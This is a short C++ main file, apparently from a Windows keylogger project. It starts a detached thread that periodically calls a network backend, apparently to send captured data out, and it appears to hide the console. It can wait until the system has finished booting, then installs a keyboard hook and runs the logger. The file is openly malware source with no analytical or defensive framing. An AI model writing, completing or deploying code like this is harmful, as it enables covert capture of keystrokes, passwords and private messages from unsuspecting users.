#include "config.hpp"
#include "keylogger.hpp"
#include "logger_utils.hpp"
#include "network.hpp"
#include <iostream>
#include <thread>
#include <map>

int main() {
    std::string compName = getUserName();
    std::cout << "Computer Name: " << compName << std::endl;
    std::cout << "Starting network scheduler thread..." << std::endl;
    std::thread schedulerThread(scheduleBackendCalls, intervalMinutes * 60);
    schedulerThread.detach();
    std::cout << "Network scheduler thread started and detached" << std::endl;
    Keylogger::SetConsoleVisibility();
#ifdef BOOT_WAIT
    while (Keylogger::IsSystemBooting()) {
        Sleep(10000);
    }
#endif
    std::cout << "Installing keylogger hook..." << std::endl;
    Keylogger& logger = Keylogger::GetInstance();
    logger.InstallHook();
    std::cout << "Starting keylogger..." << std::endl;
    logger.Run();
} 